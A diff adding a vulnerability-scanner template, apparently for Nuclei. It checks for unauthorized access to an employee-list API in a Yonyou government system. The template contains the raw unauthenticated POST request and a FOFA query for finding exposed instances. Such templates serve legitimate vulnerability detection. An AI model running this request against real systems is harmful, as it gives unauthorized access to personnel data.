@@ -1,0 +1,32 @@
+id: poc-fngqhpsdwvhuix3n
+info:
+  name: 用友政务系统seletMaEmpListForPrsCalc存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fngqhpsdwvhuix3n'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fngqhpsdwvhuix3n
+    fofa: body="/pf/portal/login/css/fonts/style.css"
+http:
+- raw:
+  - 'POST /ma/emp/api/seletMaEmpListForPrsCalc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
+
+    Content-Type: application/json
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+
+    {"pageNum":1,"pageSize":1}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
